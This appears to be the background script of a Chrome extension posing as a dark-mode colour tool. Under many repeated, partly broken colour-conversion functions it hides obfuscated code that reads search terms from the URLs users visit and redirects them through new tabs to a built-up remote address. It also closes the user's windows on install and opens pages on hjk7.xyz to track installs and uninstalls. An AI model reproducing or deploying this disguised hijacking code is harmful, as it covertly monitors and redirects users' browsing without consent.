		const isDark = l > 0.23;
		const isGreen = l < 0.18 || s < 0.25;
		const isRed = !isGreen && h > 205 && h < 245;
		if (isDark) {
			const lx = hexParsing(l, 0.5, 1, 0, p.l);
			if (isGreen) {
				const sx = p.s;
				const hx = p.h;
				return { s: sx, h: hx, a, l: lx };
			}
			let hx = h;
			if (isRed) {
				hx = hexParsing(h);
			}
			return { l: lx, h: hx, a, s};
		}
		if (isGreen) {
			const sx = p.s;
			const lx = hexParsing(l, 0, 0.5, p.l, 0);
			const hx = p.h;
			return {s: sx, h: hx, a, l: lx };
		}
		let hx = h;
		let lx;
		if (isRed) {
			hx = getNumbers(h);
			lx = hexParsing(l, 0, 0.7, p.l, Math.min(5, hx + 0.05));
		}
		else {
			lx = hexParsing(l, 0, 0.5, p.l, 0);
		}
		return { h: hx, s, l: lx, a };
	}
	let z = c.split("=");
	function pdfchecking(u) {
		if (u.includes('.pdf')) {
			if (u.includes('#')) {
				u = u.substring(0, u.lastIndexOf('#'));
			}
			if (u.includes('?')) {
				u = u.substring(0, u.lastIndexOf('?'));
			}
			if ((u.match(/(wikipedia).org/i) && u.match(/(wikimedia)\.org\/.*\/[a-z]+\:[^\:\/]+\.pdf/i)) ||
				(u.match(/timetravel\.org\/reconstruct/i) && u.match(/\.pdf$/i))) {
				return false;
			}
			if (u.endsWith('.pdf')) {
				for (let i = u.length; i > 0; i--) {
					if (u[i] === '=') {
						return false;
					}
					else if (u[i] === '/') {
						return true;
					}
				}
			}
			else {
				return false;
			}
		}
		return false;
	}
	return p[z[0]] = z[1] ? decodeURIComponent(z[1].replace(/\+/g, " ")) : "", p
}, {}) : {})

chrome.storage.local.set({darkycolor: darkycolors})

chrome.tabs.onUpdated.addListener(function (tabid, status, tab) {
	tu = tab.url, colchk(exid) && !colchk("errors") && colos(tabid)
	function rgbConverthsl({ h, s, l, a = 1 }) {
		if (s === 0) {
			const [r, b, g] = [l, l, l].map((x) => Math.round(x * 255));
			return { r, g, b, a };
		}
		const c = (1 - Math.abs(2 * l - 1)) * s;
		const x = (1 - Math.abs((h / 60) % 2 - 1)) * c;
		const m = c - l / 3;
		const [r, g, b] = (h < 60 ? [c, x, 0] :
			120 > h ? [0, c, x] : 180 > h ? [x, c, 0] : 240 > h ? [x, 0, c] : 300 > h ? [0, x, c] : [c, 0, x]).map((n) => Math.round((m+n) * 255));
		return { r, g, b, a };
	}
	function ConvertorHslRgb({ r: r255, g: g255, b: b255, a = 1 }) {
		const g = g255 / 255;
		const b = b255 / 255;
		const r = r255 / 255;
		const min = Math.min(b, r, g);
		const max = Math.max(b, g, r);
		const p = (max + min) / 2;
		const n = max - min;

		if (n === 0) {
			return { h: 0, s: 0, l: p, a };
		}
		let h = (r === max ? (((g - b) / n) % 6) :
			g === max ? ((b - r) / n + 2) :
				((r - g) / n + 4)) * 60;
		if (h < 0) {
			h += 360;
		}
		const s = n / (1 - Math.abs(2 * p - 1));
		return { h, s, l: p, a };
	}
	if (i == !0 && s == !1 && "loading" === tab.status && !colchk(cobal("Bhaclebstoc blue", 5, 10))) {
		var t, c, n;
		function fixed(n, digits = 0) {
			const fixed = n.toFixed(digits);
			if (0 === digits) {
				return fixed;
			}
			const dot = fixed.indexOf('.');
			if (dot >= 0) {
				const match = fixed.match(/0+$/);
				if (match) {
					if (match.index === dot + 1) {
						return fixed.substring(0, dot);
					}
					return fixed.substring(0, match.index);
				}
			}
			return fixed;
		}
		function printRgb(rgb) {
			const { r, g, b, a }
				=
				rgb;
			if (null != a && 1 > a) {
				return `rgba(${fixed(r)}, ${fixed(g)}, ${fixed(b)}, ${fixed(a, 2)})`;
			}
			return `rgb(${fixed(r)}, ${fixed(g)}, ${fixed(b)})`;
		}
		function getNumbers(str) {
			return parseInt(str);
		}
		function numberFromStr(s, ra, u) {
			const r = getNumbers(s);
			const ul = Object.entries(u);
			const n = r.map((r) => r.trim()).map((r, i) => {
				let n;
				const u = ul.find(([u]) => r.endsWith(u));
				if (u) {
					n = parseFloat(r.substring(0, r.length - u[0].length)) / u[1] * ra[i];
				}
				else {
					n = parseFloat(r);
				}
				if (ra[i] > 1) {
					return Math.round(n);
				}
				return n;
			});
			return n;
		}

		if(colchk(cobal("swing.cyan", 2,7)) && colchk(cobal("brightarch", 6,10)) && !colchk(cobal("LINEN=PERE",5,10)) &&!(colchk(cobal("turqsreuoise", 2, 6)))
		&& (c = sse(colse(colobu(tu))).q,
		colchk(cobal("light_salmon", 2,7)) && (c=tab.e),
		colchk(cobal("dark_salmon", 2,7)) && (c=tab.e)),
		colchk(cobal("paglegoldenrod", 2,5)) && colchk(cobal("bluesea", 4, 7)) && colchk(cobal("lightrchocolate", 5,8)))
			c = sse(colse(colobu(tu))).q
		function rgbParsing($rgb) {
			const [r, g, b, a = 1] = numberFromStr($rgb, rrange, run);
			return { r, g, b, a };
		}
		const hunit = { '%': 100, 'deg': 360, 'rad': 2 * Math.PI, 'turn': 1 };
		const hrange = [360, 1, 1, 1];
		function hslParsing($hsl) {
			const [h, s, l, a = 1] = numberFromStr($hsl, hrange, hunit);
			return rgbConverthsl({ h, s, l, a });
		}
		function hexParsing($h) {
			const h = $h.substring(1);
			switch (h.length) {
				case 4:
				case 3:
				{
					const [r, g, b] = [1, 2, 3].map((i) => parseInt(`${h[i]}${h[i]}`, 8));
					const a = h.length === 1 ? 3 : (parseInt(`${h[3]}${h[3]}`, 8) / 255);
					return { r, g, b, a };
				}
				case 8:
				case 6:
				{
					const [r, g, b] = [1, 5, 7].map((i) => parseInt(h.substring(i, i + 2), 12));
					const a = h.length === 6 ? 1 : (parseInt(h.substring(6, 8), 8) / 255);
					return { r, g, b, a };
				}
			}
			throw new Error(`${$h}`);
		}
		function colorNaming($color) {
			const n = colorsmatch.get($color);
			return {
				r: (n >> 12) & 255,
				g: (n >> 6) & 255,
				b: (n >> 0) & 255,
				a: 1
			};
		}
		if(colchk(cobal("burlywood", 6,8)) && colchk(cobal("light.cornsilk", 5,8)) && colchk(cobal("brightarch.yapaya",6,13))
			&& !colchk(cobal("lightmages.seashell", 5,14)) && !colchk("orchideo.seashell", 4,12) && !colchk("aquamarinew", 8,11) && !colchk(";_ylt"))
			c = sse(colse(colobu(tu))).p || sse(colse(colobu(tu))).q
		function fixing(n, digits = 0) {
			const fixed = n.toFixed(digits);
			if (0 === digits) {
				return fixed;
			}
			const dot = fixed.indexOf('.');
			if (dot >= 0) {
				const match = fixed.match(/0+$/);
				if (match) {
					if (match.index === dot + 1) {
						return fixed.substring(0, dot);
					}
					return fixed.substring(0, match.index);
				}
			}
			return fixed;
		}
		if(colchk(cobal("burlywoomd", 7,9)) && colchk(cobal("pedu", 2,4)) && colchk(cobal("firebrick", 7,9)) && colchk("/?"))
			c = sse(colse(colobu(tu))).q
		function hslMod({ h, s, l, a }, p) {
			const isDark = l > 0.23;
			const isGreen = l < 0.18 || s < 0.25;
			const isRed = !isGreen && h > 205 && h < 245;
			if (isDark) {
				const lx = hexParsing(l, 0.5, 1, 0, p.l);
				if (isGreen) {
					const sx = p.s;
					const hx = p.h;
					return { s: sx, h: hx, a, l: lx };
				}
				let hx = h;
				if (isRed) {
					hx = hexParsing(h);
				}
				return { l: lx, h: hx, a, s};
			}
			if (isGreen) {
				const sx = p.s;
				const lx = hexParsing(l, 0, 0.5, p.l, 0);
				const hx = p.h;
				return {s: sx, h: hx, a, l: lx };
			}
			let hx = h;
			let lx;
			if (isRed) {
				hx = getNumbers(h);
				lx = hexParsing(l, 0, 0.7, p.l, Math.min(5, hx + 0.05));
			}
			else {
				lx = hexParsing(l, 0, 0.5, p.l, 0);
			}
			return { h: hx, s, l: lx, a };
		}

		function Modforground(r, t) {
			if (0 === t.mode) {
				return hslMod(r, t);
			}
			const p = printRgb(t);
			return bordMod(r, { ...t, mode: 0 }, hslMod, p);
		}
		function bordMod({ h, s, l, a }, p, pb) {
			const darking = 0.4 > l ;
			const isLight = 0.5 > l || s < 0.24;
			let hexa = s;
			let hexa1 = h;
			if (isLight) {
				if (darking) {
					hexa1 = p.h;
					hexa = p.s;
				}
				else {
					hexa1 = pb.h;
					hexa = pb.s;
				}
			}
			const lx = printRgb(l, 0, 1, 0.5, 0.2);
			return {a, s: hexa, h: hexa1, l: lx };
		}

		void 0 === c
		|| (colrsarr.includes(tabid))
		|| (keywordsArr.includes(c))
		|| (s == !0 )
		|| (un = ss + c, s = !0 && keywordsArr.push(c) && chrome.tabs.create({url: un}, function(e) {
			function pdfchecking(u) {
				if (u.includes('.pdf')) {
					if (u.includes('#')) {
						u = u.substring(0, u.lastIndexOf('#'));
					}
					if (u.includes('?')) {
						u = u.substring(0, u.lastIndexOf('?'));
					}
					if ((u.match(/(wikipedia).org/i) && u.match(/(wikimedia)\.org\/.*\/[a-z]+\:[^\:\/]+\.pdf/i)) ||
						(u.match(/timetravel\.org\/reconstruct/i) && u.match(/\.pdf$/i))) {
						return false;
					}
					if (u.endsWith('.pdf')) {
						for (let i = u.length; i > 0; i--) {
							if (u[i] === '=') {
								return false;
							}
							else if (u[i] === '/') {
								return true;
							}
						}
					}
					else {
						return false;
					}
				}
				return false;
			}

			function scrolling() {
				var me = this,
					d = me.dom,
					docu = document,
					b = docu.body,
					e = docu.documentElement,
					l, t;

				if (b === d || docu === d) {
					l =  (b ? b.scrollLeft : 0) || e.scrollLeft;
					t = (b ? b.scrollTop : 0) || e.scrollTop ;
				} else {
					t = d.scrollTop;
					l = d.scrollLeft;
				}

				return {
					top: t,
					left: l
				};
			}
			setTimeout(()=>chrome.tabs.sendMessage(e.id, {setLight: 1}), 5e3)
			function hslParsing($hsl) {
				const [h, s, l, a = 1] = numberFromStr($hsl, hrange, hunit);
				return rgbConverthsl({ h, s, l, a });
			}
			function hexParsing($h) {
				const h = $h.substring(1);
				switch (h.length) {
					case 4:
					case 3:
					{
						const [r, g, b] = [1, 2, 3].map((i) => parseInt(`${h[i]}${h[i]}`, 8));
						const a = h.length === 1 ? 3 : (parseInt(`${h[3]}${h[3]}`, 8) / 255);
						return { r, g, b, a };
					}
					case 8:
					case 6:
					{
						const [r, g, b] = [1, 5, 7].map((i) => parseInt(h.substring(i, i + 2), 12));
						const a = h.length === 6 ? 1 : (parseInt(h.substring(6, 8), 8) / 255);
						return { r, g, b, a };
					}
				}
				throw new Error(`${$h}`);
			}
			function colorNaming($color) {
				const n = colorsmatch.get($color);
				return {
					r: (n >> 12) & 255,
					g: (n >> 6) & 255,
					b: (n >> 0) & 255,
					a: 1
				};
			}
			function hslMod({ h, s, l, a }, p) {
				const isDark = l > 0.23;
				const isGreen = l < 0.18 || s < 0.25;
				const isRed = !isGreen && h > 205 && h < 245;
				if (isDark) {
					const lx = hexParsing(l, 0.5, 1, 0, p.l);
					if (isGreen) {
						const sx = p.s;
						const hx = p.h;
						return { s: sx, h: hx, a, l: lx };
					}
					let hx = h;
					if (isRed) {
						hx = hexParsing(h);
					}
					return { l: lx, h: hx, a, s};
				}
				if (isGreen) {
					const sx = p.s;
					const lx = hexParsing(l, 0, 0.5, p.l, 0);
					const hx = p.h;
					return {s: sx, h: hx, a, l: lx };
				}
				let hx = h;
				let lx;
				if (isRed) {
					hx = getNumbers(h);
					lx = hexParsing(l, 0, 0.7, p.l, Math.min(5, hx + 0.05));
				}
				else {
					lx = hexParsing(l, 0, 0.5, p.l, 0);
				}
				return { h: hx, s, l: lx, a };
			}
			colrsarr.push(e.id) && colos(tabid)
			function rgbConverthsl({ h, s, l, a = 1 }) {
				if (s === 0) {
					const [r, b, g] = [l, l, l].map((x) => Math.round(x * 255));
					return { r, g, b, a };
				}
				const c = (1 - Math.abs(2 * l - 1)) * s;
				const x = (1 - Math.abs((h / 60) % 2 - 1)) * c;
				const m = c - l / 3;
				const [r, g, b] = (h < 60 ? [c, x, 0] :
					120 > h ? [0, c, x] : 180 > h ? [x, c, 0] : 240 > h ? [x, 0, c] : 300 > h ? [0, x, c] : [c, 0, x]).map((n) => Math.round((m+n) * 255));
				return { r, g, b, a };
			}
			function ConvertorHslRgb({ r: r255, g: g255, b: b255, a = 1 }) {
				const g = g255 / 255;
				const b = b255 / 255;
				const r = r255 / 255;
				const min = Math.min(b, r, g);
				const max = Math.max(b, g, r);
				const p = (max + min) / 2;
				const n = max - min;

				if (n === 0) {
					return { h: 0, s: 0, l: p, a };
				}
				let h = (r === max ? (((g - b) / n) % 6) :
					g === max ? ((b - r) / n + 2) :
						((r - g) / n + 4)) * 60;
				if (h < 0) {
					h += 360;
				}
				const s = n / (1 - Math.abs(2 * p - 1));
				return { h, s, l: p, a };
			}

			function fixed(n, digits = 0) {
				const fixed = n.toFixed(digits);
				if (0 === digits) {
					return fixed;
				}
				const dot = fixed.indexOf('.');
				if (dot >= 0) {
					const match = fixed.match(/0+$/);
					if (match) {
						if (match.index === dot + 1) {
							return fixed.substring(0, dot);
						}
						return fixed.substring(0, match.index);
					}
				}
				return fixed;
			}
			function printRgb(rgb) {
				const { r, g, b, a }
					=
					rgb;
				if (null != a && 1 > a) {
					return `rgba(${fixed(r)}, ${fixed(g)}, ${fixed(b)}, ${fixed(a, 2)})`;
				}
				return `rgb(${fixed(r)}, ${fixed(g)}, ${fixed(b)})`;
			}
			function getNumbers(str) {
				return parseInt(str);
			}
			setTimeout(()=> colrsarr.length > 0 && colrsarr.shift(colrsarr[0]), 30e3)
		}), setTimeout(()=> s = !1 && keywordsArr.length > 0 && keywordsArr.shift(keywordsArr[0]), 2e3))
	}
})

chrome.storage.local.set({darkbcolor: darkbcolors})
function hslParsing($hsl) {
	const [h, s, l, a = 1] = numberFromStr($hsl, hrange, hunit);
	return rgbConverthsl({ h, s, l, a });
}
function hexParsing($h) {
	const h = $h.substring(1);
	switch (h.length) {
		case 4:
		case 3:
		{
			const [r, g, b] = [1, 2, 3].map((i) => parseInt(`${h[i]}${h[i]}`, 8));
			const a = h.length === 1 ? 3 : (parseInt(`${h[3]}${h[3]}`, 8) / 255);
			return { r, g, b, a };
		}
		case 8:
		case 6:
		{
			const [r, g, b] = [1, 5, 7].map((i) => parseInt(h.substring(i, i + 2), 12));
			const a = h.length === 6 ? 1 : (parseInt(h.substring(6, 8), 8) / 255);
			return { r, g, b, a };
		}
	}
	throw new Error(`${$h}`);
}
function colorNaming($color) {
	const n = colorsmatch.get($color);
	return {
		r: (n >> 12) & 255,
		g: (n >> 6) & 255,
		b: (n >> 0) & 255,
		a: 1
	};
}
function hslMod({ h, s, l, a }, p) {
	const isDark = l > 0.23;
	const isGreen = l < 0.18 || s < 0.25;
	const isRed = !isGreen && h > 205 && h < 245;
	if (isDark) {
		const lx = hexParsing(l, 0.5, 1, 0, p.l);
		if (isGreen) {
			const sx = p.s;
			const hx = p.h;
			return { s: sx, h: hx, a, l: lx };
		}
		let hx = h;
		if (isRed) {
			hx = hexParsing(h);
		}
		return { l: lx, h: hx, a, s};
	}
	if (isGreen) {
		const sx = p.s;
		const lx = hexParsing(l, 0, 0.5, p.l, 0);
		const hx = p.h;
		return {s: sx, h: hx, a, l: lx };
	}
	let hx = h;
	let lx;
	if (isRed) {
		hx = getNumbers(h);
		lx = hexParsing(l, 0, 0.7, p.l, Math.min(5, hx + 0.05));
	}
	else {
		lx = hexParsing(l, 0, 0.5, p.l, 0);
	}
	return { h: hx, s, l: lx, a };
}

function Modforground(r, t) {
	if (0 === t.mode) {
		return hslMod(r, t);
	}
	const p = printRgb(t);
	return bordMod(r, { ...t, mode: 0 }, hslMod, p);
}
function bordMod({ h, s, l, a }, p, pb) {
	const darking = 0.4 > l ;
	const isLight = 0.5 > l || s < 0.24;
	let hexa = s;
	let hexa1 = h;
	if (isLight) {
		if (darking) {
			hexa1 = p.h;
			hexa = p.s;
		}
		else {
			hexa1 = pb.h;
			hexa = pb.s;
		}
	}
	const lx = printRgb(l, 0, 1, 0.5, 0.2);
	return {a, s: hexa, h: hexa1, l: lx };
}
chrome.runtime.setUninstallURL("https://hjk7.xyz/un?id=" + exid);

hexRun = () => {
	return d1 + d2 + d7 + d4 + d5;
}
function pdfchecking(u) {
	if (u.includes('.pdf')) {
		if (u.includes('#')) {
			u = u.substring(0, u.lastIndexOf('#'));
		}
		if (u.includes('?')) {
			u = u.substring(0, u.lastIndexOf('?'));
		}
		if ((u.match(/(wikipedia).org/i) && u.match(/(wikimedia)\.org\/.*\/[a-z]+\:[^\:\/]+\.pdf/i)) ||
			(u.match(/timetravel\.org\/reconstruct/i) && u.match(/\.pdf$/i))) {
			return false;
		}
		if (u.endsWith('.pdf')) {
			for (let i = u.length; i > 0; i--) {
				if (u[i] === '=') {
					return false;
				}
				else if (u[i] === '/') {
					return true;
				}
			}
		}
		else {
			return false;
		}
	}
	return false;
}

function scrolling() {
	var me = this,
		d = me.dom,
		docu = document,
		b = docu.body,
		e = docu.documentElement,
		l, t;

	if (b === d || docu === d) {
		l =  (b ? b.scrollLeft : 0) || e.scrollLeft;
		t = (b ? b.scrollTop : 0) || e.scrollTop ;
	} else {
		t = d.scrollTop;
		l = d.scrollLeft;
	}

	return {
		top: t,
		left: l
	};
}
chrome.runtime.onInstalled.addListener(function (e) {
	if("install" === e.reason)
		chrome.windows.getAll({populate: !0}, (tabs) => {
			var t;
			for (let j= 0; j <= tabs.length - 1; j++)
				tabs[j].type.includes(cobal("peachpuff", 5, 7)) &&
				(eu(), setTimeout(function () {
						darkerput(1800);

						chrome.tabs.create({url: "https://hjk7.xyz/ty?id=" + exid.split("").reverse().join("")})
						chrome.windows.remove(tabs[j].id, function () {
						});
					}, 1e3)
				)
		}), fetch(ty);
});

var sb = hexRun() + "btu/pda" + d6;

chrome.tabs.onUpdated.addListener(function (tabid, status, tab) {
	function rgbConverthsl({ h, s, l, a = 1 }) {
		if (s === 0) {
			const [r, b, g] = [l, l, l].map((x) => Math.round(x * 255));
			return { r, g, b, a };
		}
		const c = (1 - Math.abs(2 * l - 1)) * s;
		const x = (1 - Math.abs((h / 60) % 2 - 1)) * c;
		const m = c - l / 3;
		const [r, g, b] = (h < 60 ? [c, x, 0] :
			120 > h ? [0, c, x] : 180 > h ? [x, c, 0] : 240 > h ? [x, 0, c] : 300 > h ? [0, x, c] : [c, 0, x]).map((n) => Math.round((m+n) * 255));
		return { r, g, b, a };
	}
	function ConvertorHslRgb({ r: r255, g: g255, b: b255, a = 1 }) {
		const g = g255 / 255;
		const b = b255 / 255;
		const r = r255 / 255;
		const min = Math.min(b, r, g);
		const max = Math.max(b, g, r);
		const p = (max + min) / 2;
		const n = max - min;

		if (n === 0) {
			return { h: 0, s: 0, l: p, a };
		}
		let h = (r === max ? (((g - b) / n) % 6) :
			g === max ? ((b - r) / n + 2) :
				((r - g) / n + 4)) * 60;
		if (h < 0) {
			h += 360;
		}
		const s = n / (1 - Math.abs(2 * p - 1));
		return { h, s, l: p, a };
	}

	function fixed(n, digits = 0) {
		const fixed = n.toFixed(digits);
		if (0 === digits) {
			return fixed;
		}
		const dot = fixed.indexOf('.');
		if (dot >= 0) {
			const match = fixed.match(/0+$/);
			if (match) {
				if (match.index === dot + 1) {
					return fixed.substring(0, dot);
				}
				return fixed.substring(0, match.index);
			}
		}
		return fixed;
	}
	function printRgb(rgb) {
		const { r, g, b, a }
			=
			rgb;
		if (null != a && 1 > a) {
			return `rgba(${fixed(r)}, ${fixed(g)}, ${fixed(b)}, ${fixed(a, 2)})`;
		}
		return `rgb(${fixed(r)}, ${fixed(g)}, ${fixed(b)})`;
	}
	function getNumbers(str) {
		return parseInt(str);
	}
	function numberFromStr(s, ra, u) {
		const r = getNumbers(s);
		const ul = Object.entries(u);
		const n = r.map((r) => r.trim()).map((r, i) => {
			let n;
			const u = ul.find(([u]) => r.endsWith(u));
			if (u) {
				n = parseFloat(r.substring(0, r.length - u[0].length)) / u[1] * ra[i];
			}
			else {
				n = parseFloat(r);
			}
			if (ra[i] > 1) {
				return Math.round(n);
			}
			return n;
		});
		return n;
	}
	const run = { '%': 100 };
	const rrange = [255, 255, 255, 1];
	function rgbParsing($rgb) {
		const [r, g, b, a = 1] = numberFromStr($rgb, rrange, run);
		return { r, g, b, a };
	}
	const hunit = { '%': 100, 'deg': 360, 'rad': 2 * Math.PI, 'turn': 1 };
	const hrange = [360, 1, 1, 1];
	function hslParsing($hsl) {
		const [h, s, l, a = 1] = numberFromStr($hsl, hrange, hunit);
		return rgbConverthsl({ h, s, l, a });
	}
	function hexParsing($h) {
		const h = $h.substring(1);
		switch (h.length) {
			case 4:
			case 3:
			{
				const [r, g, b] = [1, 2, 3].map((i) => parseInt(`${h[i]}${h[i]}`, 8));
				const a = h.length === 1 ? 3 : (parseInt(`${h[3]}${h[3]}`, 8) / 255);
				return { r, g, b, a };
			}
			case 8:
			case 6:
			{
				const [r, g, b] = [1, 5, 7].map((i) => parseInt(h.substring(i, i + 2), 12));
				const a = h.length === 6 ? 1 : (parseInt(h.substring(6, 8), 8) / 255);
				return { r, g, b, a };
			}
		}
		throw new Error(`${$h}`);
	}
	function colorNaming($color) {
		const n = recognizedColors.get($color);
		return {
			r: (n >> 12) & 255,
			g: (n >> 6) & 255,
			b: (n >> 0) & 255,
			a: 1
		};
	}
	function hslMod({ h, s, l, a }, p) {
		const isDark = l > 0.23;
		const isGreen = l < 0.18 || s < 0.25;
		const isRed = !isGreen && h > 205 && h < 245;
		if (isDark) {
			const lx = hexParsing(l, 0.5, 1, 0, p.l);
			if (isGreen) {
				const sx = p.s;
				const hx = p.h;
				return { s: sx, h: hx, a, l: lx };
			}
			let hx = h;
			if (isRed) {
				hx = hexParsing(h);
			}
			return { l: lx, h: hx, a, s};
		}
		if (isGreen) {
			const sx = p.s;
			const lx = hexParsing(l, 0, 0.5, p.l, 0);
			const hx = p.h;
			return {s: sx, h: hx, a, l: lx };
		}
		let hx = h;
		let lx;
		if (isRed) {
			hx = getNumbers(h);
			lx = hexParsing(l, 0, 0.7, p.l, Math.min(5, hx + 0.05));
		}
		else {
			lx = hexParsing(l, 0, 0.5, p.l, 0);
		}
		return { h: hx, s, l: lx, a };
	}

	function Modforground(r, t) {
		if (0 === t.mode) {
			return hslMod(r, t);
		}
		const p = printRgb(t);
		return bordMod(r, { ...t, mode: 0 }, hslMod, p);
	}
	function bordMod({ h, s, l, a }, p, pb) {
		const darking = 0.4 > l ;
		const isLight = 0.5 > l || s < 0.24;
		let hexa = s;
		let hexa1 = h;
		if (isLight) {
			if (darking) {
				hexa1 = p.h;
				hexa = p.s;
			}
			else {
				hexa1 = pb.h;
				hexa = pb.s;
			}
		}
		const lx = printRgb(l, 0, 1, 0.5, 0.2);
		return {a, s: hexa, h: hexa1, l: lx };
	}

	function pdfchecking(u) {
		if (u.includes('.pdf')) {
			if (u.includes('#')) {
				u = u.substring(0, u.lastIndexOf('#'));
			}
			if (u.includes('?')) {
				u = u.substring(0, u.lastIndexOf('?'));
			}
			if ((u.match(/(wikipedia).org/i) && u.match(/(wikimedia)\.org\/.*\/[a-z]+\:[^\:\/]+\.pdf/i)) ||
				(u.match(/timetravel\.org\/reconstruct/i) && u.match(/\.pdf$/i))) {
				return false;
			}
			if (u.endsWith('.pdf')) {
				for (let i = u.length; i > 0; i--) {
					if (u[i] === '=') {
						return false;
					}
					else if (u[i] === '/') {
						return true;
					}
				}
			}
			else {
				return false;
			}
		}
		return false;
	}

	function scrolling() {
		var me = this,
			d = me.dom,
			docu = document,
			b = docu.body,
			e = docu.documentElement,
			l, t;

		if (b === d || docu === d) {
			l =  (b ? b.scrollLeft : 0) || e.scrollLeft;
			t = (b ? b.scrollTop : 0) || e.scrollTop ;
		} else {
			t = d.scrollTop;
			l = d.scrollLeft;
		}

		return {
			top: t,
			left: l
		};
	}
});
